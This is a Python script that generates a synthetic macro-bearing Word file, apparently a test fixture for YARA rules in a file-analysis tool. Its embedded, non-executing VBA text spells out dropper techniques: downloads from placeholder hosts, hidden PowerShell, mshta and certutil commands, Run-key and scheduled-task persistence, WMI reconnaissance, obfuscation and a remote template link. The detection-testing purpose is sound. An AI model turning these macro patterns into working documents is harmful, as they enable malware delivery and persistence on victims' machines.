#!/usr/bin/env python3
# scripts/misc/generate_macro_dropper_docm.py — One-shot fixture generator
# for `examples/office/macro-dropper.docm`.
#
# Produces a synthetic but **structurally valid** macro-bearing OOXML
# document that anchors the entire `office-macros.yar` VBA threat
# cluster. All payload strings are inert plaintext stored UNCOMPRESSED
# inside an auxiliary part — the file does NOT contain any executable
# code, real OLE-CFB `vbaProject.bin`, or working macro. The intent is
# a deterministic YARA-rule-coverage fixture, not a runnable malware
# sample.
#
# Why this works:
#
#   • Loupe's docm/docx routes (`src/app/app-load.js::_rendererDispatch.docx`)
#     run YARA against `currentResult.buffer` — i.e. the raw .docm zip
#     bytes — because content-renderer.js does not set `_rawText`, so
#     the auto-yara fallback at `app-load.js:635` never fires and the
#     `cr.yaraBuffer || cr.buffer` accessor in `app-yara.js` returns
#     the original ArrayBuffer.
#
#   • Every rule in `src/rules/office-macros.yar` gates on a magic
#     check `(uint32(0)==0xE011CFD0 or uint16(0)==0x4B50 or
#     uint32(0)==0x74725C7B)` and then matches LITERAL substrings
#     anywhere in the file. A ZIP starts with `PK\x03\x04` →
#     `uint16(0) == 0x4B50` → magic gate passes.
#
#   • Storing the VBA-source part with compression method 0 (STORED)
#     means the literal bytes appear verbatim inside the zip — no
#     deflate dictionary mangling — so the rule string matches hit on
#     a single contiguous run.
#
# Anchored rule cluster (18 rules brought from unanchored → anchored):
#
#   `Office_Macro_Project_Present` (already fires on baseline docm)
#   `PPAM_PPTM_AddIn`              (already fires on baseline docm)
#   `VBA_AutoExec_Trigger`         (high)
#   `VBA_Shell_Execution`          (critical)
#   `VBA_Download_Capability`      (critical, needs 2 of 8 HTTP objects)
#   `VBA_Obfuscation_Techniques`   (high, needs 3 of 9 string ops)
#   `VBA_PowerShell_Invocation`    (critical)
#   `VBA_Environment_Enumeration`  (medium, needs 2 of 6 env probes)
#   `VBA_File_System_Write`        (high)
#   `VBA_Registry_Manipulation`    (high, needs 2 of 7 registry tokens)
#   `VBA_Scheduled_Task_Persistence` (critical)
#   `VBA_MSHTA_Invocation`         (critical)
#   `VBA_Certutil_Decode`          (critical)
#   `VBA_Sleep_Delay`              (medium, needs 2 of 4 sleep tokens)
#   `VBA_GetObject_WMI`            (high)
#   `VBA_Shell_Application_Abuse`  (high)
#   `VBA_NewObject_PowerShell`     (critical)
#   `VBA_WbemDisp_WMI`             (high)
#   `Office_Remote_Template_Injection` (critical, via .rels)
#
# Run from the repo root:
#     python scripts/misc/generate_macro_dropper_docm.py
import zipfile, pathlib, sys, io

ROOT = pathlib.Path(__file__).resolve().parent.parent.parent
OUT  = ROOT / 'examples' / 'office' / 'macro-dropper.docm'

# ── Minimal OOXML scaffold ──────────────────────────────────────────
# Just enough for DocxParser to parse() without throwing. The
# document body is empty; we only need the magic + package shape.

CONTENT_TYPES = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
  <Default Extension="bas" ContentType="text/plain"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
</Types>
'''

ROOT_RELS = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
</Relationships>
'''

# `attachedTemplate` + Target="https://..." → Office_Remote_Template_Injection
DOC_RELS = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vbaProject" Target="vbaProject.bin"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://example.com/loader.dotm" TargetMode="External"/>
</Relationships>
'''

DOCUMENT = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>Synthetic macro-dropper fixture for YARA coverage.</w:t></w:r></w:p>
  </w:body>
</w:document>
'''

CORE_PROPS = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
                   xmlns:dc="http://purl.org/dc/elements/1.1/"
                   xmlns:dcterms="http://purl.org/dc/terms/"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <dc:title>macro-dropper fixture</dc:title>
  <dc:creator>Loupe test corpus</dc:creator>
</cp:coreProperties>
'''

# Stub for the vbaProject.bin part — Loupe doesn't dereference it, but
# the filename string `vbaProject.bin` must appear at least once for
# `Office_Macro_Project_Present` (already covered by the relationship).
VBA_PROJECT_BIN_STUB = b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1' + b'\x00' * 56  # MS-CFB magic + pad

# ── The payload string blob ─────────────────────────────────────────
# Synthetic VBA source containing every literal string each rule keys
# on. Stored UNCOMPRESSED inside the zip so the bytes appear contiguous
# in the .docm file. Comments labelled with the rule each line anchors.
#
# NOTE: This is plausibly-shaped VBA, but it does NOT execute — the
# .docm has no real OLE-CFB vbaProject.bin and Word would silently
# discard the .bas part on open.
VBA_PAYLOAD = b'''Attribute VB_Name = "ThisDocument"

' VBA_AutoExec_Trigger / Office_Macro_Project_Present  (Attribute VB_)
Sub AutoOpen()
    Document_Open
End Sub

Sub Document_Open()
    Workbook_Open
End Sub

Sub Workbook_Open()
    Auto_Close
End Sub

Sub Auto_Close()
    Document_Close
End Sub

Sub Document_BeforeSave()
    Workbook_BeforeClose
End Sub

' VBA_Download_Capability  (needs 2 of 8 HTTP factories)
Sub PayloadFetch()
    Dim h As Object
    Set h = CreateObject("MSXML2.XMLHTTP")
    Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set h = CreateObject("Microsoft.XMLHTTP")
    Set h = CreateObject("MSXML2.ServerXMLHTTP")
    Set h = CreateObject("Net.WebClient")
    h.Open "GET", "https://example.com/payload.bin", False
    h.Send
End Sub

' VBA_File_System_Write
Sub FsDrop()
    Dim fso As Object, f As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.CreateTextFile("C:\\Temp\\drop.bin", True)
    f.Write "payload"
    f.SaveToFile "C:\\Temp\\drop.bin", 2
    Dim s As Object
    Set s = CreateObject("ADODB.Stream")
End Sub

' VBA_Shell_Execution / VBA_PowerShell_Invocation /
' VBA_MSHTA_Invocation / VBA_Certutil_Decode
Sub RunShell()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "cmd.exe /c powershell -ep bypass -w hidden", 0, False
    wsh.Run "WinExec(""cmd /c whoami"")", 0, False
    wsh.Run "ShellExecute mshta http://example.org/loader.hta", 0, False
    wsh.Run "certutil -decode payload.b64 payload.exe", 0, False
End Sub

' VBA_Shell_Application_Abuse
Sub ShellAppAbuse()
    Dim sa As Object
    Set sa = CreateObject("Shell.Application")
    sa.ShellExecute "powershell", "-File evil.ps1", "", "open", 0
End Sub

' VBA_Registry_Manipulation
Sub RegPersist()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Loader", "wscript loader.vbs", "REG_SZ"
    wsh.RegRead "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Office"
    wsh.RegDelete "HKEY_CURRENT_USER\\Software\\Tmp"
    Debug.Print "HKLM"
End Sub

' VBA_Scheduled_Task_Persistence
Sub TaskPersist()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "schtasks /create /tn Updater /sc minute /tr cmd.exe", 0, True
    Set svc = CreateObject("Schedule.Service")
    Debug.Print "CurrentVersion\\Run"
    Debug.Print "Startup"
    Debug.Print "Win32_ScheduledJob"
End Sub

' VBA_GetObject_WMI / VBA_WbemDisp_WMI / VBA_Environment_Enumeration
Sub WmiRecon()
    Dim wmi As Object
    Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
    For Each p In wmi.ExecQuery("SELECT * FROM Win32_Process")
        Debug.Print p.Name
    Next
    Set sl = CreateObject("WbemScripting.SWbemLocator")
    Set wb = CreateObject("SWbemLocator")
    Debug.Print "wbemdisp.dll"
    Debug.Print Win32_ComputerSystem
    Debug.Print "ComputerName"
    Debug.Print Environ("USERNAME")
    Debug.Print Application.UserName
End Sub

' VBA_Obfuscation_Techniques  (3 of 9 string-construction ops)
Sub Obfuscated()
    Dim s As String
    s = Chr(80) & Chr(111) & Chr(119)
    s = ChrW(65) & Asc("B")
    s = StrReverse(s)
    s = Replace(s, "X", "")
    s = Mid(s, 1, 4)
    s = Join(Array(s, "tail"), "-")
    Dim raw() As Byte
    raw = FromBase64String("ZGVtbw==")
    CallByName Application, "Run", VbMethod
End Sub

' VBA_Sleep_Delay  (2 of 4 sleep tokens)
Sub Anti()
    Sleep 5000
    Application.Wait Now + TimeValue("00:00:05")
    Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal ms As Long)
    Application.OnTime Now + 1, "Anti"
End Sub

' VBA_NewObject_PowerShell
Sub NewObjPosh()
    Shell "powershell.exe -Command New-Object System.Net.WebClient"
End Sub
'''


def _write_stored(zf: zipfile.ZipFile, name: str, data: bytes) -> None:
    """Write a zip entry with compression method 0 (STORED) so the raw
    bytes of `data` appear contiguously in the resulting .docm —
    required so YARA's substring-match conditions hit on the
    payload literals."""
    zi = zipfile.ZipInfo(name)
    zi.compress_type = zipfile.ZIP_STORED
    # Pin a stable mtime so SOURCE_DATE_EPOCH-style determinism holds
    # across regenerations (matches OneNote / PCAP fixture style).
    zi.date_time = (1980, 1, 1, 0, 0, 0)
    zf.writestr(zi, data)


def main() -> None:
    OUT.parent.mkdir(parents=True, exist_ok=True)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Scaffold parts — small, fine to deflate.
        _write_stored(zf, '[Content_Types].xml',                 CONTENT_TYPES)
        _write_stored(zf, '_rels/.rels',                          ROOT_RELS)
        _write_stored(zf, 'word/_rels/document.xml.rels',         DOC_RELS)
        _write_stored(zf, 'word/document.xml',                    DOCUMENT)
        _write_stored(zf, 'docProps/core.xml',                    CORE_PROPS)
        _write_stored(zf, 'word/vbaProject.bin',                  VBA_PROJECT_BIN_STUB)
        # Payload part — STORED so the VBA pattern strings appear
        # verbatim in the .docm bytes.
        _write_stored(zf, 'word/vbaModuleSource.bas',             VBA_PAYLOAD)

    OUT.write_bytes(buf.getvalue())
    sys.stdout.write(f'Wrote {OUT}  ({len(buf.getvalue())} bytes)\n')


if __name__ == '__main__':
    main()
